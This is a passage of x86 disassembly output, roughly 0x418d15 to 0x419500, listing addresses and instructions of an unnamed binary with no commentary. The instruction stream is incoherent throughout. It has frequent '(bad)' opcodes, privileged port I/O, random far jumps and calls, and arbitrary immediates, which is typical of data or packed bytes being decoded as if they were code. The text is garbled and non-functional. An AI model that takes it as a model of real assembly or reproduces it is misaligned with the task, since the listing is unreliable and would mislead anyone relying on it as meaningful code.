  418d15:	xor    DWORD PTR [esi-0x6e],edi
  418d18:	lahf   
  418d19:	jmp    0x39ac90e1
  418d1e:	cs sbb dl,bh
  418d21:	mov    ds,WORD PTR [esi]
  418d23:	lods   eax,DWORD PTR ds:[esi]
  418d24:	add    bh,BYTE PTR [esi+0x7a915634]
  418d2a:	jmp    0x810a:0x2129e914
  418d31:	(bad)  
  418d32:	rcl    esp,cl
  418d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d36:	sbb    edi,edx
  418d38:	jmp    0xd3bd:0x349b350e
  418d3f:	clc    
  418d40:	inc    ebx
  418d41:	xchg   ebp,eax
  418d42:	retf   
  418d43:	jecxz  0x418cf6
  418d45:	lods   eax,DWORD PTR ds:[esi]
  418d46:	hlt    
  418d47:	mov    ecx,0x73d7eed4
  418d4c:	cli    
  418d4d:	sub    esp,DWORD PTR [ecx+0x5b]
  418d50:	pop    ebp
  418d51:	pop    eax
  418d52:	and    DWORD PTR [ecx],ecx
  418d54:	into   
  418d55:	sbb    al,0x96
  418d57:	jge    0x418d17
  418d59:	out    dx,eax
  418d5a:	mov    WORD PTR [ebp-0x4e],ds
  418d5d:	iret   
  418d5e:	test   eax,0x976dff7a
  418d63:	pop    ss
  418d64:	imul   eax,DWORD PTR [ecx+edx*4],0x4f
  418d68:	adc    ah,BYTE PTR [ebx+0x5033a1c7]
  418d6e:	test   al,0xa8
  418d70:	push   0xda650198
  418d75:	xchg   ebp,eax
  418d76:	fcom   DWORD PTR [ecx]
  418d78:	sbb    eax,ebx
  418d7a:	jmp    0x177cc621
  418d7f:	cwde   
  418d80:	jecxz  0x418d23
  418d82:	push   es
  418d83:	dec    esi
  418d84:	rcl    BYTE PTR [edi+0x1f],cl
  418d87:	std    
  418d88:	in     al,dx
  418d89:	xchg   esp,eax
  418d8a:	dec    esi
  418d8b:	add    dh,dh
  418d8d:	pop    edx
  418d8e:	ret    
  418d8f:	mov    ss,esi
  418d91:	ja     0x418d6f
  418d93:	pop    ds
  418d94:	div    DWORD PTR [esi-0x79]
  418d97:	dec    edx
  418d98:	test   al,0x1c
  418d9a:	popf   
  418d9b:	loope  0x418dad
  418d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d9e:	(bad)  [eax+esi*4]
  418da1:	call   0xe51f15
  418da6:	inc    ebx
  418da7:	shr    DWORD PTR [ecx-0x58233c97],cl
  418dad:	leave  
  418dae:	or     BYTE PTR [ecx],0x7c
  418db1:	sub    dl,BYTE PTR [edx-0x2a]
  418db4:	or     bl,BYTE PTR [edx+0x2929f07]
  418dba:	mov    edi,0xab30d8b2
  418dbf:	mov    esi,0xc01b67ec
  418dc4:	daa    
  418dc5:	push   edi
  418dc6:	mov    eax,0xd83bec00
  418dcb:	cdq    
  418dcc:	sub    BYTE PTR [edi],dh
  418dce:	and    DWORD PTR [ecx+0x6dae3d99],0xaecaa7fa
  418dd8:	adc    al,BYTE PTR [ecx+0x27a0439c]
  418dde:	not    DWORD PTR [esi-0x4119c4c5]
  418de4:	fstp   DWORD PTR [edi]
  418de6:	or     ch,BYTE PTR [ecx+ecx*8-0x370a98df]
  418ded:	push   esi
  418dee:	jl     0x418dac
  418df0:	jmp    0x259e8f7b
  418df5:	aaa    
  418df6:	sbb    al,BYTE PTR [edi-0xc9ab67c]
  418dfc:	inc    ebp
  418dfd:	jns    0x418de3
  418dff:	cld    
  418e00:	and    ebp,DWORD PTR [edi+0x1c]
  418e03:	mov    eax,0x22c84834
  418e08:	fidiv  WORD PTR ds:0xf07ffb73
  418e0e:	into   
  418e0f:	cmp    bl,BYTE PTR [edx-0x3a]
  418e12:	pop    ss
  418e13:	mov    eax,ds:0x1bcead3a
  418e18:	mov    bl,0x8a
  418e1a:	dec    ecx
  418e1b:	lahf   
  418e1c:	daa    
  418e1d:	cwde   
  418e1e:	mov    ch,BYTE PTR [ebx+ebp*2+0x415bb516]
  418e25:	mov    cl,0xee
  418e27:	sub    eax,0xae83b083
  418e2c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  418e2e:	jae    0x418ddc
  418e30:	jno    0x418df8
  418e32:	xor    ebp,DWORD PTR [eax+0x4f]
  418e35:	(bad)  
  418e37:	ds test al,0x84
  418e3a:	xor    ecx,esp
  418e3c:	xchg   DWORD PTR [edi],edx
  418e3e:	popa   
  418e3f:	es jle 0x418e26
  418e42:	(bad)  
  418e43:	imul   DWORD PTR [esi]
  418e45:	jl     0x418e7a
  418e47:	jbe    0x418e0e
  418e49:	xchg   BYTE PTR [edi+0x7154cba9],cl
  418e4f:	push   eax
  418e50:	pop    ss
  418e51:	test   eax,0x2b85653d
  418e56:	xchg   ecx,eax
  418e57:	push   cs
  418e58:	test   al,0xac
  418e5a:	mov    bh,0xe9
  418e5c:	mov    dl,0xb3
  418e5e:	or     al,BYTE PTR [edx]
  418e60:	mov    bl,0x26
  418e62:	ss dec esi
  418e64:	push   edi
  418e65:	dec    eax
  418e66:	jno    0x418eae
  418e68:	aam    0x95
  418e6a:	idiv   ebx
  418e6c:	xor    bl,bh
  418e6e:	fsub   st(3),st
  418e70:	and    eax,0x260fe706
  418e75:	(bad)  
  418e76:	mov    esp,0xd0d56da6
  418e7b:	dec    eax
  418e7c:	mov    edi,0x2e93dd36
  418e81:	cdq    
  418e82:	dec    edx
  418e83:	add    al,0x2a
  418e85:	inc    edi
  418e86:	adc    esp,DWORD PTR [edi+0x18abd957]
  418e8c:	xchg   ebx,eax
  418e8d:	add    esi,0xffffffac
  418e90:	dec    esp
  418e91:	inc    ebp
  418e92:	inc    edi
  418e93:	lock ja 0x418f02
  418e96:	in     eax,0x52
  418e98:	mov    dh,0x97
  418e9a:	out    0xa5,eax
  418e9c:	iret   
  418e9d:	pop    es
  418e9e:	cmp    eax,0x8fbc69f
  418ea3:	fistp  WORD PTR [eax+0x742cc70d]
  418ea9:	sub    eax,0x3390b16d
  418eae:	sub    ebp,DWORD PTR [eax]
  418eb0:	push   esi
  418eb1:	and    bh,BYTE PTR [eax]
  418eb3:	and    DWORD PTR [ebx+0x33],ebx
  418eb6:	push   ebp
  418eb7:	aam    0x3e
  418eb9:	push   ebx
  418eba:	push   edi
  418ebb:	jecxz  0x418e56
  418ebd:	dec    edi
  418ebf:	daa    
  418ec0:	mov    dl,0x52
  418ec2:	sub    BYTE PTR [edi+0x6d],dh
  418ec5:	ja     0x418e98
  418ec7:	lds    eax,FWORD PTR ds:0xecfd8989
  418ecd:	mov    ds:0x68ae458d,eax
  418ed2:	inc    esp
  418ed3:	gs adc ax,0x6253
  418ed8:	jbe    0x418ea3
  418eda:	fist   WORD PTR [esi-0x3e3a043d]
  418ee0:	lock or ch,BYTE PTR [ebx+0x4b1632d5]
  418ee7:	call   0x29db90ea
  418eec:	jne    0x418f12
  418eee:	mov    ds:0x6608b1ac,eax
  418ef3:	jns    0x418ef8
  418ef5:	dec    ecx
  418ef6:	rcr    ebx,cl
  418ef8:	arpl   bp,cx
  418efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418efb:	lea    ebp,[ebp-0x11]
  418efe:	nop
  418eff:	out    dx,eax
  418f00:	hlt    
  418f01:	or     eax,0x5637a973
  418f06:	retf   0xbf3c
  418f09:	pop    esp
  418f0a:	popa   
  418f0b:	push   es
  418f0c:	pop    es
  418f0d:	xor    dl,al
  418f0f:	mov    ebp,ss
  418f11:	mov    esp,0xac096270
  418f16:	data16 shr BYTE PTR [ebp+0x68e97412],0x55
  418f1e:	into   
  418f1f:	daa    
  418f20:	push   ebp
  418f21:	leave  
  418f22:	or     ebx,edx
  418f24:	daa    
  418f25:	cmp    edi,DWORD PTR [edx+0xa8012b6]
  418f2b:	fs fs pop es
  418f2e:	mov    bh,0xd8
  418f30:	xor    al,dl
  418f32:	scas   eax,DWORD PTR es:[edi]
  418f33:	mov    eax,ds:0x36ca6b81
  418f38:	adc    ah,BYTE PTR [edi-0x6c]
  418f3b:	ds loop 0x418f79
  418f3e:	push   ebx
  418f3f:	jle    0x418f3a
  418f41:	or     al,0x87
  418f43:	cmc    
  418f44:	je     0x418efc
  418f46:	jbe    0x418ed6
  418f48:	icebp  
  418f49:	scas   al,BYTE PTR es:[edi]
  418f4a:	and    eax,0xf64d58e0
  418f4f:	inc    esp
  418f50:	test   eax,0x7fe02157
  418f55:	popf   
  418f56:	div    BYTE PTR [esi-0x44c87229]
  418f5c:	xchg   edx,eax
  418f5d:	adc    edx,0xd13c94ab
  418f63:	xchg   esp,eax
  418f64:	xor    DWORD PTR [ebx],ecx
  418f66:	cmp    al,0x8c
  418f68:	call   FWORD PTR [ecx+0x76]
  418f6b:	test   esi,ebp
  418f6d:	fild   WORD PTR [edx-0x574bc035]
  418f73:	int3   
  418f74:	enter  0x75a3,0xc4
  418f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f79:	lea    edx,[edi-0x17]
  418f7c:	jge    0x418fb5
  418f7e:	les    eax,FWORD PTR [esi-0x500b01fb]
  418f84:	sub    edx,eax
  418f86:	mov    al,ds:0x370bd6e8
  418f8b:	jp     0x418ffa
  418f8d:	stos   BYTE PTR es:[edi],al
  418f8e:	dec    BYTE PTR [edx-0x15]
  418f91:	aad    0x72
  418f93:	mov    ds:0x3aca2330,eax
  418f98:	push   esi
  418f99:	or     edx,DWORD PTR [eax]
  418f9b:	cmp    eax,0xf2e2f1ae
  418fa0:	adc    ecx,ecx
  418fa2:	or     al,0x19
  418fa4:	push   es
  418fa5:	lds    esi,FWORD PTR ds:0xeddad8
  418fab:	fs aas 
  418fad:	xchg   ebx,esi
  418faf:	pop    edx
  418fb0:	cmp    DWORD PTR [ebp+edi*2-0x3b52fde6],edi
  418fb7:	mov    cl,0xb7
  418fb9:	popa   
  418fba:	dec    ebx
  418fbb:	jmp    DWORD PTR [edx+0x1d]
  418fbe:	push   ecx
  418fbf:	adc    edx,edi
  418fc1:	hlt    
  418fc2:	stos   DWORD PTR es:[edi],eax
  418fc3:	mov    bh,0x1b
  418fc5:	sbb    al,0x74
  418fc7:	push   ss
  418fc8:	retf   0x8ce9
  418fcb:	inc    edi
  418fcc:	jae    0x418ff5
  418fce:	pop    edi
  418fcf:	sti    
  418fd0:	outs   dx,BYTE PTR ds:[esi]
  418fd1:	adc    eax,0xfb3ea042
  418fd6:	sbb    eax,0xcc0885c2
  418fdb:	ret    
  418fdc:	ins    BYTE PTR es:[edi],dx
  418fdd:	dec    ebx
  418fde:	nop
  418fdf:	mov    WORD PTR [edi],?
  418fe1:	and    eax,0x91da81e8
  418fe6:	sub    dl,dl
  418fe8:	add    DWORD PTR [edi],edi
  418fea:	xchg   edx,eax
  418feb:	pop    esi
  418fec:	sub    edi,DWORD PTR [ebx+0x3c]
  418fef:	adc    BYTE PTR [edx+ebx*8-0x3705c68],cl
  418ff6:	repz std 
  418ff8:	mov    esp,0xc0d1bbb9
  418ffd:	bound  ecx,QWORD PTR [ecx+0x2b]
  419000:	test   eax,0x6fd4cbf9
  419005:	ins    DWORD PTR es:[edi],dx
  419006:	pop    edi
  419007:	ins    BYTE PTR es:[edi],dx
  419008:	cmp    DWORD PTR [eax+esi*1+0xe],0x24072f1f
  419010:	outs   dx,BYTE PTR ds:[esi]
  419011:	mov    DWORD PTR [edi],0xca76bb40
  419017:	push   cs
  419018:	dec    esp
  419019:	ins    BYTE PTR es:[edi],dx
  41901a:	jbe    0x419009
  41901c:	clc    
  41901d:	ds dec ebx
  41901f:	sub    BYTE PTR [edx+edi*4],cl
  419022:	or     bl,bh
  419024:	mov    edx,0xd8fd070f
  419029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41902a:	stos   DWORD PTR es:[edi],eax
  41902b:	stc    
  41902c:	sub    ah,BYTE PTR [edi-0x75]
  41902f:	mov    WORD PTR [ecx+0x753341],?
  419035:	inc    edi
  419036:	repz fcmovbe st,st(4)
  419039:	lock or al,0x1b
  41903c:	aam    0x0
  41903e:	mov    ebp,0x3ad9dc8d
  419043:	jmp    0x2d10:0xb086a56b
  41904a:	mov    edx,0xe74ba534
  41904f:	mov    ecx,0xa4889d77
  419054:	sub    al,0xbf
  419056:	loopne 0x41903f
  419058:	das    
  419059:	mov    ebp,0x9933214c
  41905e:	aaa    
  41905f:	mov    WORD PTR [eax-0x67],ss
  419062:	je     0x418ffc
  419064:	mov    eax,0x292e5110
  419069:	cmp    al,0x49
  41906b:	mov    esi,0xbe5a4389
  419070:	jb     0x4190c4
  419072:	pop    es
  419073:	sub    BYTE PTR [edx-0x32],0x52
  419077:	repnz rcl BYTE PTR [eax+eiz*4-0x24f8c226],cl
  41907f:	cmp    eax,0x85413bea
  419084:	aas    
  419085:	xchg   esi,eax
  419086:	fisubr DWORD PTR [eax-0x535c6d38]
  41908c:	ror    DWORD PTR [edi-0x78e2818],1
  419092:	jmp    0x19c8bf6f
  419097:	(bad)  
  419098:	aam    0xd9
  41909a:	add    DWORD PTR [edx-0x14bb275b],ebx
  4190a0:	scas   al,BYTE PTR es:[edi]
  4190a1:	pop    ebp
  4190a2:	cmp    eax,0x1583a691
  4190a7:	lea    edi,[edx-0x6d]
  4190aa:	add    DWORD PTR [eax],eax
  4190ac:	mov    dl,0x78
  4190ae:	ds in  eax,dx
  4190b0:	sbb    eax,0x4de2fe1c
  4190b5:	in     eax,dx
  4190b6:	ins    BYTE PTR es:[edi],dx
  4190b7:	in     eax,dx
  4190b8:	jb     0x419069
  4190ba:	(bad)  [edx]
  4190bc:	cmp    DWORD PTR [edx+0x47e3d204],edx
  4190c2:	aaa    
  4190c3:	and    eax,0x251b3ebd
  4190c8:	jnp    0x4190d8
  4190ca:	push   0xffffffe1
  4190cc:	cdq    
  4190cd:	xchg   ebx,eax
  4190ce:	add    bh,bh
  4190d0:	rcl    BYTE PTR [eax-0x989caa],cl
  4190d6:	int    0xaa
  4190d8:	outs   dx,BYTE PTR ds:[esi]
  4190d9:	inc    esi
  4190da:	jne    0x4190eb
  4190dc:	call   0xd89fc774
  4190e1:	pop    edi
  4190e2:	cmp    edi,DWORD PTR [ecx+0x3f]
  4190e5:	sbb    eax,0xe45a9288
  4190ea:	push   ecx
  4190eb:	stc    
  4190ec:	and    BYTE PTR [ebp-0x4],0x4f
  4190f0:	pop    ecx
  4190f1:	push   esp
  4190f2:	cmp    al,0x1
  4190f4:	xchg   BYTE PTR [esi+ecx*8-0x1f],ah
  4190f8:	jle    0x41910e
  4190fa:	xchg   DWORD PTR [eax-0x413183aa],edx
  419100:	dec    edx
  419101:	push   ss
  419102:	mov    BYTE PTR [ecx+0x6c491154],dh
  419108:	jb     0x4190ce
  41910a:	push   esp
  41910b:	jecxz  0x419153
  41910d:	daa    
  41910e:	in     al,0xc
  419110:	enter  0x809e,0xc7
  419114:	push   esp
  419115:	add    al,BYTE PTR [edx+0x650b5ab7]
  41911b:	push   eax
  41911c:	out    dx,eax
  41911d:	add    edx,eax
  41911f:	sub    ah,dh
  419121:	aam    0x22
  419123:	test   DWORD PTR [edx-0x445331ad],edi
  419129:	dec    ebx
  41912a:	mov    al,ds:0xd232f439
  41912f:	stos   BYTE PTR es:[edi],al
  419130:	jmp    0xd311:0xd8755095
  419137:	mov    edi,0xb7bfaaf2
  41913c:	push   edx
  41913e:	xlat   BYTE PTR ds:[ebx]
  41913f:	adc    eax,0x1c673dce
  419144:	jg     0x41914d
  419146:	dec    esi
  419147:	cs lahf 
  419149:	adc    dh,cl
  41914b:	sub    BYTE PTR [eax],bl
  41914d:	jns    0x4190f5
  41914f:	fnstenv [edi-0x6d778853]
  419155:	pop    ebp
  419156:	dec    eax
  419157:	sub    ch,cl
  419159:	lahf   
  41915a:	mov    ah,0xba
  41915c:	ror    DWORD PTR [edx-0x3f707674],cl
  419162:	push   ecx
  419163:	in     al,0x69
  419165:	cmp    DWORD PTR [eax],0x63
  419168:	jg     0x4191c2
  41916a:	xchg   edi,eax
  41916b:	lds    ebp,FWORD PTR [ebp-0x2a70eda1]
  419171:	add    cl,bl
  419173:	jnp    0x41916f
  419175:	(bad)  
  419176:	cli    
  419177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419178:	fcmovnbe st,st(5)
  41917a:	pop    edi
  41917b:	cs inc ecx
  41917d:	mov    bh,0x39
  41917f:	neg    esi
  419181:	xchg   edi,eax
  419182:	sub    bh,BYTE PTR [ebp-0x17]
  419185:	pop    ss
  419186:	mov    ebx,0xc3bb2945
  41918b:	xor    eax,0x43f58da
  419190:	rcr    ah,cl
  419192:	out    dx,eax
  419193:	adc    BYTE PTR [edi],ah
  419195:	cmp    DWORD PTR [eax-0x71],eax
  419198:	mov    ebp,0x2db17c1
  41919d:	ds push edx
  41919f:	mov    DWORD PTR [edx+0x1d],esi
  4191a2:	sar    DWORD PTR [edi],0x90
  4191a5:	and    bl,BYTE PTR [edx-0x1a]
  4191a8:	aad    0x6d
  4191aa:	pop    esi
  4191ab:	stc    
  4191ac:	pushf  
  4191ad:	or     dl,BYTE PTR [eax-0x12]
  4191b0:	shl    DWORD PTR [esi-0x2d],1
  4191b3:	out    0x93,eax
  4191b5:	adc    bh,BYTE PTR [eax+0x7e]
  4191b8:	jmp    0x4191fc
  4191ba:	and    DWORD PTR [ebp-0x5fd66096],esp
  4191c0:	stos   DWORD PTR es:[edi],eax
  4191c1:	test   eax,0xf72f8708
  4191c6:	sar    BYTE PTR [esi+0x110b04ca],cl
  4191cc:	jae    0x4191e5
  4191ce:	xor    BYTE PTR [edi],ch
  4191d0:	arpl   WORD PTR [eax-0x738dddfa],cx
  4191d6:	call   0x7e91:0x8f713b77
  4191dd:	call   0xa307:0xd5fc501c
  4191e4:	cmp    ecx,DWORD PTR [ebx+0x2e]
  4191e7:	xor    al,0xa5
  4191e9:	add    al,0x9d
  4191eb:	jo     0x419237
  4191ed:	pop    ss
  4191ee:	(bad)  [ebx]
  4191f0:	xor    edi,DWORD PTR [edx-0x6d]
  4191f3:	inc    eax
  4191f4:	jno    0x4191cd
  4191f6:	xchg   edi,eax
  4191f7:	or     ebp,DWORD PTR [eax]
  4191f9:	sub    eax,0x198e4133
  4191fe:	xchg   edx,eax
  4191ff:	xor    BYTE PTR [eax-0x1b74c7c4],ah
  419205:	sub    ebx,DWORD PTR [ebp-0x2d6ae58e]
  41920b:	dec    esp
  41920c:	(bad)  
  41920d:	mov    edi,0x755870ff
  419212:	data16 cmp bh,al
  419215:	jmp    0xdc6a3d0b
  41921a:	retf   
  41921b:	jbe    0x419201
  41921d:	fistp  WORD PTR [ebx-0x35a0ba5e]
  419223:	gs ss or eax,0x2cd0392a
  41922a:	loopne 0x4191c5
  41922c:	fiadd  DWORD PTR [edx]
  41922e:	hlt    
  41922f:	pop    edx
  419230:	test   DWORD PTR ds:0x20cba338,0x47c868f2
  41923a:	(bad)  
  41923b:	fnstenv [ebp+0x24647ff7]
  419241:	shl    BYTE PTR [ebp-0x65],1
  419244:	(bad)  
  419246:	aas    
  419247:	adc    DWORD PTR [eax-0x5e],0x2fa5927e
  41924e:	(bad)  
  41924f:	mov    ds:0x760cfad8,eax
  419254:	adc    al,ah
  419256:	int    0xab
  419258:	out    dx,eax
  419259:	or     DWORD PTR [edi],esi
  41925b:	dec    ecx
  41925c:	fcmove st,st(2)
  41925e:	xchg   bl,dh
  419260:	out    dx,al
  419261:	sub    esp,eax
  419263:	push   ebx
  419264:	aaa    
  419265:	iret   
  419266:	(bad)  
  419267:	out    0x6,eax
  419269:	les    esi,FWORD PTR [eax]
  41926b:	(bad)  
  41926d:	push   edi
  41926e:	and    DWORD PTR [esi+0xef3f44],edi
  419274:	pop    ebp
  419275:	out    0x94,eax
  419277:	cmp    bl,BYTE PTR [ebx-0x5f53d0e1]
  41927d:	mov    bh,BYTE PTR [ebx+0x1d9ebebe]
  419283:	(bad)  
  419284:	lock inc edx
  419286:	jge    0x4192b7
  419288:	popf   
  419289:	(bad)  
  41928a:	sbb    BYTE PTR [esi+0x29],ch
  41928d:	add    edx,DWORD PTR [ebp-0x4d2bad8e]
  419293:	aaa    
  419294:	mov    ah,0xaf
  419296:	lods   eax,DWORD PTR ds:[esi]
  419297:	jle    0x419275
  419299:	or     al,0xab
  41929b:	xchg   ebp,eax
  41929c:	push   edx
  41929d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41929e:	sahf   
  41929f:	mov    ebx,0x52f6715f
  4192a4:	imul   esi,DWORD PTR [ebx-0x73c3a5e],0xa6ab202b
  4192ae:	push   edi
  4192af:	sub    BYTE PTR [esp+ebx*2-0x5a],ah
  4192b3:	stos   DWORD PTR es:[edi],eax
  4192b4:	test   BYTE PTR [ebx+0xc],cl
  4192b7:	loope  0x4192bd
  4192b9:	jge    0x4192af
  4192bb:	cmp    eax,0x16c146d5
  4192c0:	and    eax,0x6bfa99d6
  4192c5:	test   dl,ch
  4192c7:	jmp    0x419287
  4192c9:	ror    BYTE PTR [ebx-0x32],0x80
  4192cd:	stos   DWORD PTR es:[edi],eax
  4192ce:	loopne 0x4192df
  4192d0:	inc    ebp
  4192d1:	pop    ss
  4192d2:	or     al,ch
  4192d4:	sbb    eax,0x279a6787
  4192d9:	dec    ebx
  4192da:	leave  
  4192db:	mov    ds:0xdaeffa49,al
  4192e0:	and    al,0x80
  4192e2:	ins    DWORD PTR es:[edi],dx
  4192e3:	pop    edi
  4192e4:	dec    ebx
  4192e5:	sbb    al,BYTE PTR [edx-0x5ae2b9c9]
  4192eb:	mov    dl,0xc8
  4192ed:	jge    0x419324
  4192ef:	aaa    
  4192f0:	inc    edi
  4192f1:	inc    ecx
  4192f2:	add    al,0x68
  4192f4:	das    
  4192f5:	pop    es
  4192f6:	iret   
  4192f7:	std    
  4192f8:	fsub   st,st(1)
  4192fa:	xchg   edx,eax
  4192fb:	mov    dl,0x1d
  4192fd:	js     0x4192ad
  4192ff:	push   edx
  419300:	int    0xc1
  419302:	xor    al,BYTE PTR [ebp+0x4500db89]
  419308:	mov    ah,0xb8
  41930a:	leave  
  41930b:	arpl   WORD PTR [edx+0x4d0b3e03],ax
  419311:	xchg   ecx,eax
  419312:	mov    ecx,0xea0a90a8
  419317:	jle    0x41932c
  419319:	xchg   ebp,eax
  41931a:	dec    ebx
  41931b:	push   0x3e40319b
  419320:	fsub   st(7),st
  419322:	ja     0x41931c
  419324:	gs sub al,0x49
  419327:	inc    esi
  419328:	(bad)  
  41932a:	(bad)  
  41932b:	jnp    0x41932f
  41932d:	mov    al,dl
  41932f:	fwait
  419330:	retf   
  419331:	xchg   esi,eax
  419332:	ss xchg ecx,eax
  419334:	xchg   ecx,eax
  419335:	mov    ds:0x53e092da,al
  41933a:	sbb    edx,esp
  41933c:	pop    esi
  41933d:	jbe    0x41934e
  41933f:	mov    DWORD PTR [ebp+0x350642b7],ebp
  419345:	adc    ch,BYTE PTR [esi]
  419347:	sbb    eax,0xe08d1476
  41934c:	mov    edi,0x5e1fe2d6
  419351:	or     dh,BYTE PTR [ebx]
  419353:	and    al,BYTE PTR [eax]
  419355:	in     eax,0x38
  419357:	out    0x21,eax
  419359:	(bad)  
  41935a:	loope  0x419330
  41935c:	sub    al,0x42
  41935e:	pop    ebp
  41935f:	push   0x1a
  419361:	adc    BYTE PTR [ecx],dl
  419363:	pop    esp
  419364:	mov    esp,0xf5828855
  419369:	mov    ah,0x4
  41936b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936c:	jmp    0xe281:0xbfe72c3e
  419373:	in     eax,0x2e
  419375:	pop    ds
  419376:	jecxz  0x419370
  419378:	sysret 
  41937a:	push   ecx
  41937b:	test   DWORD PTR [edx],eax
  41937d:	sti    
  41937e:	push   ss
  41937f:	fistp  WORD PTR ds:[ebp+0x2b16db18]
  419386:	pop    esp
  419387:	sub    al,0xb5
  419389:	fdivr  DWORD PTR [ebx+0x1f]
  41938c:	out    0xb6,al
  41938e:	sub    bl,BYTE PTR [ebx]
  419390:	push   ebp
  419391:	(bad)  
  419393:	xchg   esi,eax
  419394:	push   esp
  419395:	(bad)  
  419396:	fimul  DWORD PTR [ecx-0x11]
  419399:	outs   dx,DWORD PTR ds:[esi]
  41939a:	cmp    al,0x72
  41939c:	mov    dl,BYTE PTR [ebp-0x6d]
  41939f:	and    al,ah
  4193a1:	dec    ebp
  4193a2:	dec    esp
  4193a3:	lods   eax,DWORD PTR ds:[esi]
  4193a4:	aam    0x9
  4193a6:	dec    edx
  4193a7:	out    0x2c,al
  4193a9:	(bad)  
  4193aa:	or     al,BYTE PTR [ebx+0x4f]
  4193ad:	es push ebx
  4193af:	lods   al,BYTE PTR ds:[esi]
  4193b0:	push   esi
  4193b1:	popaw  
  4193b3:	or     eax,0xa0d1ab82
  4193b8:	add    cl,BYTE PTR gs:[di-0x6e]
  4193bd:	inc    edx
  4193be:	(bad)  
  4193bf:	test   eax,0xd3bec112
  4193c4:	xor    BYTE PTR [esi+0x5b],al
  4193c7:	jno    0x419375
  4193c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ca:	pop    ebp
  4193cb:	jnp    0x419384
  4193cd:	pop    edx
  4193ce:	xchg   BYTE PTR [edx-0x57af592c],bh
  4193d4:	ja     0x4193f3
  4193d6:	dec    ebp
  4193d7:	fimul  DWORD PTR [edx+0x9782f6d]
  4193dd:	sbb    DWORD PTR [edx],edx
  4193df:	jbe    0x419439
  4193e1:	mov    ?,WORD PTR [esi]
  4193e3:	arpl   WORD PTR [edi],sp
  4193e5:	js     0x4193c3
  4193e7:	mov    edi,0x348b351e
  4193ec:	popa   
  4193ed:	call   0xe116a52
  4193f2:	mov    ebp,0xce1b5f41
  4193f7:	inc    esi
  4193f8:	test   DWORD PTR [esi+0x7d],edi
  4193fb:	mov    bh,0xb3
  4193fd:	mov    eax,ds:0x15b33197
  419402:	adc    eax,0xcb96ab19
  419407:	xchg   ebp,eax
  419408:	call   DWORD PTR ds:0x1d2584ae
  41940e:	jp     0x41948c
  419410:	rol    edi,cl
  419412:	das    
  419413:	xor    bh,BYTE PTR [esi]
  419415:	pop    es
  419416:	inc    esp
  419417:	(bad)  
  419418:	loop   0x4193c9
  41941a:	mov    dl,0xf5
  41941c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41941d:	outs   dx,DWORD PTR ds:[esi]
  41941e:	jmp    0xe5195a16
  419423:	mov    ebx,0x7ecf7dd1
  419428:	fild   WORD PTR [edi+0x7]
  41942b:	call   0xb972:0x9ea26bb
  419432:	jp     0x4193bb
  419434:	xor    bl,dh
  419436:	ins    DWORD PTR es:[edi],dx
  419437:	cmp    DWORD PTR [edx-0x78],ecx
  41943a:	add    ch,BYTE PTR [edi+0x64]
  41943d:	sbb    BYTE PTR [edx],ch
  41943f:	xor    ah,BYTE PTR [esi+0x49e44309]
  419445:	cmp    edx,DWORD PTR [edi+ebp*4-0x5f043789]
  41944c:	retf   
  41944d:	mov    al,ds:0xfc0785a1
  419452:	imul   esp,DWORD PTR [ebx],0x9d94f8e9
  419458:	jb     0x41945f
  41945a:	xor    ah,dl
  41945c:	cld    
  41945d:	pop    es
  41945e:	mov    ch,0x23
  419460:	mov    bh,0x14
  419462:	mov    ds:0x852d6c03,eax
  419467:	enter  0x1d32,0xfa
  41946b:	sar    DWORD PTR [ecx],0xf
  41946e:	icebp  
  41946f:	inc    esi
  419470:	pop    ecx
  419471:	xchg   esp,eax
  419472:	or     edx,esi
  419474:	add    eax,0x8f9efc90
  419479:	aad    0x86
  41947b:	pop    ebp
  41947c:	fiadd  WORD PTR [eax+0x3c]
  41947f:	cld    
  419480:	fdiv   DWORD PTR [ebp-0x6ac8de9d]
  419486:	xor    DWORD PTR [esi+0x8],0xffffffb5
  41948a:	mov    bl,0xe5
  41948c:	scas   al,BYTE PTR es:[edi]
  41948d:	icebp  
  41948e:	and    eax,DWORD PTR [eax]
  419490:	in     eax,dx
  419491:	adc    al,0x88
  419493:	add    cl,ah
  419495:	jno    0x419473
  419497:	(bad)  
  419498:	scas   al,BYTE PTR es:[edi]
  419499:	in     al,dx
  41949a:	pop    edx
  41949b:	fisttp QWORD PTR [edx+0x68]
  41949e:	jmp    0x23922a6
  4194a3:	clc    
  4194a4:	mov    eax,ds:0xf440b707
  4194a9:	cmp    al,0xb6
  4194ab:	pop    esi
  4194ac:	jne    0x4194ec
  4194ae:	rcl    BYTE PTR [edi+0xf571250],1
  4194b4:	out    dx,eax
  4194b5:	sbb    ebp,0x624cfe9d
  4194bb:	leave  
  4194bc:	outs   dx,BYTE PTR ds:[esi]
  4194bd:	gs ins DWORD PTR es:[edi],dx
  4194bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194c0:	mov    esi,0x5ac0f138
  4194c5:	push   ss
  4194c6:	out    0x8e,eax
  4194c8:	ret    
  4194c9:	clc    
  4194ca:	mov    dh,BYTE PTR [ebx]
  4194cc:	jne    0x419528
  4194ce:	int    0x5f
  4194d0:	adc    DWORD PTR [edx],edi
  4194d2:	aaa    
  4194d3:	jl     0x419504
  4194d5:	or     DWORD PTR [esi+0x37a598a6],esi
  4194db:	xchg   esp,eax
  4194dc:	test   al,0xe3
  4194de:	sub    esp,edi
  4194e0:	fwait
  4194e1:	lods   al,BYTE PTR ds:[esi]
  4194e2:	sbb    eax,0x854b82f7
  4194e7:	(bad)  
  4194e8:	fsubr  DWORD PTR [esi+0x68]
  4194eb:	ret    0x57c0
  4194ee:	and    DWORD PTR [eax-0x4be445e6],ebp
  4194f4:	ins    DWORD PTR es:[edi],dx
  4194f5:	imul   ebp,DWORD PTR gs:[ecx+0x53],0x160420d2
  4194fd:	jno    0x419496
  4194ff:	mov    ds:0x9b07c462,al
